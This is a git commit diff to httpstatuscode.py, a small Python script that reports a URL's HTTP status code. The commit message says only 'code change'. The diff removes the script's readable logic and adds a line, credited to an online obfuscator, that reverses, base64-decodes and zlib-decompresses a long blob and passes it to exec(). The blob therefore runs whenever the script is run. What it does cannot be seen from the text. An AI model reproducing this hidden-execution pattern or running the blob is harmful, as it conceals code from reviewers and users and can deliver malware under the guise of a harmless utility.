93b8f8de6fda7d5734a19243910ffdbf661e695b
aayush_xid_su <ayushxidsu@gmail.com>
2024-10-25 21:27:26 +0530

    code change

--- httpstatuscode.py
+++ httpstatuscode.py
@@ -22,35 +22,16 @@ error = f"{blue}[{white}!{blue}] {red}"
 info = f"{yellow}[{white}+{yellow}] {cyan}"
 info2 = f"{green}[{white}•{green}] {purple}"
 
-
-banner = f"""
-{red}⠀   ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀        ⢀⣀⣀⣀⠀⢀⣀⣀⡀
-{red}  ⠈⢻⣿⣷⣀⣾⣿⠟ ⣿⣿⠀⢸⣿⣿⣿⣷⣶⡄⠀⣠⣶⣿⣿⣿⣶⣄⢸⣿⣿⣿⣿⣿⣿⡇⣿⣿⡇⠀⣴⣾⣿⣿⣷⣦⠀⠀⠀⠀⠀⠈⠳⡄⠈⣦⠞⢁⣽⠃
-{blue}⠀ ⠀⠹⣿⣿⣿⠏⠀⠀⣿⣿⠀⢸⣿⣿⠀⢹⣿⣿⢠⣿⣿⠏⠀⢹⣿⣿⡀⠀⢰⣿⣿⠀⠀⠀ ⣿⣿⡇⢸⣿⣿⠁⠈⠿⠿⠇⠀⢀⣀⣀⣀⠀⢙⣄⠈⠀⡾⠁⠀
-{red}⠀  ⢀⣾⣿⢿⣿⣧⡀⠀⣿⣿⠀⢸⣿⣿⣀⣸⣿⣿⠈⣿⣿⣆⣀⣸⣿⣿⠁⠀⢸⣿⣿⠀⠀⠀⣿⣿⡇⠸⣿⣿⣄⣀⣶⣶⡆⠀⠸⠧⠤⠼⢠⡞⢀⣤⡀⠙⣆⠀
-{red}  ⠠⠿⠿⠏⠈⠿⠿⠷⠄⠿⠿⠀⠸⠿⠿⠿⠿⠟⠁⠀⠘⠻⠿⠿⠿⠟⠁⠀⠀⠸⠿⠿⠀⠀⠀⠿⠿⠇⠀⠙⠿⠿⠿⠿⠋⠀⠀⠀⠀⠀⠠⠯⠤⠞⠁⠳⠤⠬⠧
+# Original banner
+original_banner = f"""
+{red}                                                                    ⢀⣀⣀⣀ ⢀⣀⣀⡀
+{red}  ⠈⢻⣿⣷⣀⣾⣿⠟  ⣿⣿ ⢸⣿⣿⣿⣷⣶⡄ ⣠⣶⣿⣿⣿⣶⣄⢸⣿⣿⣿⣿⣿⣿⡇⣿⣿⡇ ⣴⣾⣿⣿⣷⣦     ⠈⠳⡄⠈⣦⠞⢁⣽⠃
+{blue}    ⠹⣿⣿⣿⠏   ⣿⣿ ⢸⣿⣿ ⢹⣿⣿⢠⣿⣿⠏ ⢹⣿⣿⡀  ⢰⣿⣿    ⣿⣿⡇⢸⣿⣿ ⠈⠿⠿⠇ ⢀⣀⣀⣀ ⢙⣄⠈ ⡾⠁ 
+{red}   ⢀⣾⣿⢿⣿⣧⡀  ⣿⣿ ⢸⣿⣿⣀⣸⣿⣿⠈⣿⣿⣆⣀⣸⣿⣿⠁ ⢸⣿⣿     ⣿⣿⡇⠸⣿⣿⣄⣀⣶⣶⡆ ⠸⠧⠤⠼⢠⡞⢀⣤⡀⠙⣆ 
+{red}  ⠠⠿⠿⠏⠈⠿⠿⠷⠄⠿⠿ ⠸⠿⠿⠿⠿⠟⠁ ⠘⠻⠿⠿⠿⠟⠁   ⠸⠿⠿     ⠿⠿⠇ ⠙⠿⠿⠿⠿⠋     ⠠⠯⠤⠞⠁⠳⠤⠬⠧
 {cyan}                                         [{blue}By {green}Aayush-xid-su{cyan}]
 """
 
-#Program to fetch the http status code give the url/api
-from urllib.request import urlopen
-from urllib.error import URLError, HTTPError
-import emoji
-
-#Taking input url from user
-requestURL = input("Enter the URL to be invoked: ")
-
-#Gets the response from URL and prints the status code, corresponding emoji and message accordingly
-try:
-    response = urlopen(requestURL)
-    #In case of success, prints success status code and thumbs_up emoji
-    print('Status code : ' + str(response.code) + ' ' + emoji.emojize(':thumbs_up:'))
-    print('Message : ' + 'Request succeeded. Request returned message - ' + response.reason)
-except HTTPError as e:
-    #In case of request failure, prints HTTP error status code and thumbs_down emoji
-    print('Status : ' + str(e.code) + ' ' + emoji.emojize(':thumbs_down:'))
-    print('Message : Request failed. Request returned reason - ' + e.reason)
-except URLError as e:
-    #In case of bad URL or connection failure, prints Win Error and thumbs_down emoji
-    print('Status :',  str(e.reason).split(']')[0].replace('[','') +  ' ' + emoji.emojize(':thumbs_down:'))
-    print('Message : '+ str(e.reason).split(']')[1])
+# Python obfuscation by freecodingtools.org
+                    
+_ = lambda __ : __import__('zlib').decompress(__import__('base64').b64decode(__[::-1]));exec((_)(b'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'))
